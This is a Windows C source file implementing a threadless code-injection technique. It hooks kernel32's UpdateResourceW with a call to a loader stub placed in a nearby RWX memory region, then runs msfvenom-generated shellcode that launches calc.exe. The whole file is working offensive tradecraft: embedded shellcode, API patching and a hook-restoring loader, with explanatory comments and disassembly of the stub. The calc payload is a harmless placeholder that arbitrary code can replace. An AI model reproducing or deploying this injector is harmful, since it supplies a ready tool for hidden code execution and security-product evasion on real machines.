# include <windows.h>
# include <stdio.h>

# define api_error(api, msg, ...) printf("[!] " api " failed with error: %d\n\t> MSG: " msg, GetLastError(), ##__VA_ARGS__)

# define TARGET_MODULE	 "kernel32.dll"		// The module containing our target function to hook
# define TARGET_FUNCTION "UpdateResourceW"	// The resource 

/* msfvenom -p windows/x64/exec cmd=calc.exe */
unsigned char shellcode[] = {
	0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
	0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
	0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
	0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
	0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
	0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
	0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
	0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
	0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
};


int main() {
	unsigned long		OffsetToShellcode,
						OldProtection;
	unsigned long long	StartAddress,
						pTargetFunction,
						BoundarySize		= 0x1000,							// 4KB alignment (4096)
						MemoryBoundaryMask	= ~( BoundarySize - 1 ),			// Logical NOT operation to create mask -> 0xFFFFF000
						MaxBoundary;
	void*				pShellcodeInTheHole = 0;
	char				FunctionHook[]		= { 0xE8, 0x00, 0x00, 0x00, 0x00 },
						LoaderShellcode[]   = { 0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
												0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00,
												0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF,
												0xE0, 0x90 };

						MaxBoundary         = 0x70000000 - ( sizeof(LoaderShellcode) + sizeof( shellcode ) );	// Maximum search range up or down. Leave enough room for payload if search goes that far.


	/*
		Step 1: Locate a memory hole within a 2GB range of the DLL containing the function to over-write with shellcode.
				This is due to how the 'call' instruction works in x64. The instruction takes a signed 32-bit operand which 
				is the offset from the current instruction pointer. A signed 32-bit integers range is +- 2GB, hence we
				must ensure the shellcode is placed within 2GB range of hooked function since call instruction will execute
				shellcode from hooked function.
	*/
	
	/* Locate a function to target for hooking */
	if ( ( pTargetFunction = ( unsigned long long )GetProcAddress( GetModuleHandleA( TARGET_MODULE ), TARGET_FUNCTION ) ) == 0 ) 
	{
		api_error("GetProcAddress", "Could not locate the target function.");
		return -1;
	}

	/* 
		Align the target function address with the memory boundary & move backwards to start of boundary. 
		Note: these calculations for the start address ensure a minimal amount of virtualalloc calls 
			  are required to locate a suitable memory hole.
	*/
	StartAddress = (pTargetFunction & MemoryBoundaryMask) - MaxBoundary;
	printf("[+] Beginning memory hole search at address: 0x%p\n", ( void* )StartAddress);

	/* Allocate memory beginning at start address & incrementing by boundary size until memory is allocated */
	while ( StartAddress < ( pTargetFunction + MaxBoundary ) ) 
	{
		if ( ( pShellcodeInTheHole = VirtualAlloc( ( LPVOID )StartAddress, sizeof(LoaderShellcode) + sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE ) ) != NULL )
		{
			break;
		}
		StartAddress += BoundarySize;
	}

	if ( !pShellcodeInTheHole )
	{
		printf("[!] Could not locate a memory hole. Quitting!\n");
		return -1;
	}
	printf("[+] Found memory hole at 0x%p\n", pShellcodeInTheHole);

	/*
		Step 2: Prepare for hook restoration by copying original function bytes from target function to the loader. The loader
				will restore original function bytes to remove the hook before executing the payload. The loader is stored in
				'ShellcodeLoader'. This shellcode was skidripped from CCob :p
								
				https://github.com/CCob/ThreadlessInject/blob/master/ThreadlessInject/Program.cs#L56
				==========================================================================================
		        This function generates the following shellcode.
				The hooked function export is determined by immediately popping the return address and subtracting by 5 (size of relative call instruction)
				Original function arguments are pushed onto the stack to restore after the injected shellcode is executed
				The hooked function bytes are restored to the original values (essentially a one time hook)
				A relative function call is made to the injected shellcode that will follow immediately after the stub
				Original function arguments are popped off the stack and restored to the correct registers
				A jmp back to the original unpatched export restoring program behavior as normal
         
				This shellcode loader stub assumes that the injector has left the hooked function RWX to enable restoration,
				the injector can then monitor for when the restoration has occured to restore the memory back to RX

        
				  start:
					0:  58                      pop    rax
					1:  48 83 e8 05             sub    rax,0x5
					5:  50                      push   rax
					6:  51                      push   rcx
					7:  52                      push   rdx
					8:  41 50                   push   r8
					a:  41 51                   push   r9
					c:  41 52                   push   r10
					e:  41 53                   push   r11
					10: 48 b9 88 77 66 55 44    movabs rcx,0x1122334455667788
					17: 33 22 11
					1a: 48 89 08                mov    QWORD PTR [rax],rcx
					1d: 48 83 ec 40             sub    rsp,0x40
					21: e8 11 00 00 00          call   shellcode
					26: 48 83 c4 40             add    rsp,0x40
					2a: 41 5b                   pop    r11
					2c: 41 5a                   pop    r10
					2e: 41 59                   pop    r9
					30: 41 58                   pop    r8
					32: 5a                      pop    rdx
					33: 59                      pop    rcx
					34: 58                      pop    rax
					35: ff e0                   jmp    rax
				  shellcode:
	*/
	memcpy( &LoaderShellcode[18], ( unsigned long long* )pTargetFunction, sizeof( unsigned long long) );

	/*
		Step 3: Insert the hook into our target function. This hook is a secondary shellcode which jumps to our
				main shellcode.
	*/
	OffsetToShellcode = (unsigned long)((unsigned long long)pShellcodeInTheHole - ( pTargetFunction + sizeof(FunctionHook) ));	    // Get offset from main payload to the target function
	memcpy( &FunctionHook[1], &OffsetToShellcode, sizeof(OffsetToShellcode) );														// Add offset to 'call' (e8) instruction operand in the patch
	printf("[+] Patched hook with offset to shellcode: 0x%0.8X\n", OffsetToShellcode);
	
	if ( !VirtualProtect( ( void* )pTargetFunction, sizeof(FunctionHook), PAGE_READWRITE, &OldProtection ) ) 
	{
		api_error( "VirtualProtect", "Could not set initial memory protections on target function: %s", TARGET_FUNCTION );
		return -1;
	}

	memcpy( ( void* )pTargetFunction, &FunctionHook, sizeof(FunctionHook) );
	printf("[+] Wrote hook to %s at 0x%p\n", TARGET_FUNCTION, ( void* )pTargetFunction);

	if ( !VirtualProtect( ( void* )pTargetFunction, sizeof(FunctionHook), PAGE_EXECUTE_READWRITE, &OldProtection ) )
	{
		api_error("VirtualProtect", "Could not memory protections on target function %s to RWX", TARGET_FUNCTION);
		return -1;
	}

	/* Step 4: Now we need to write the loader & shellcode into the memory hole. The loader will be added first, followed by the main payload. */
	memcpy( pShellcodeInTheHole, &LoaderShellcode, sizeof(LoaderShellcode) );
	memcpy( ( void* )( ( unsigned long long )pShellcodeInTheHole + sizeof( LoaderShellcode ) ), &shellcode, sizeof( shellcode ) );
	
	printf("[+] Copied loader & main shellcode to memory hole. Executing payload!\n");

	/* Step 5: Execute the hooked function to trigger the payload */
	UpdateResourceW( 0, 0, 0, 0, 0, 0 );
	
	printf("[+] Exited cleanly! Press enter to quit\n");
	getchar();
	return 0;
}